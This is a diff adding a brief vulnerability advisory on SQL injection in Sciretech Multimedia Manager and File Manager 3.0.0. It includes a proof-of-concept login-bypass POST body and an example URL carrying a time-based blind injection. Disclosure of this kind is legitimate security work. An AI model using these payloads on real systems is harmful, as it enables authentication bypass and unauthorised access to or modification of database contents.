@@ -1,0 +1,13 @@
+source: http://www.securityfocus.com/bid/55390/info
+
+Sciretech Multimedia Manager and Sciretech File Manager are prone to multiple SQL-injection vulnerabilities because they fail to sufficiently sanitize user-supplied data before using it in an SQL query.
+
+Exploiting these issues could allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.
+
+Sciretech Multimedia Manager 3.0.0 and Sciretech File Manager 3.0.0 are vulnerable; other versions may also be affected. 
+
+Post Data:
+dbuser_user_email=admin%40domain.com%27+and+99%3D99--+and+0%3D%270&dbuser_user_password=WILL_BYPASS_IT_LIKE_2X2&login=Login
+
+Example URL:
+http://www.example.com/index.php?module=user&content=execute&execute=user_account_activation&user_email=pipi@pipi.com%27%20or%20sleep%2810%29--%20and%205=%275&activation_key=TS0nz4hLVgZ83mrvgtPS 
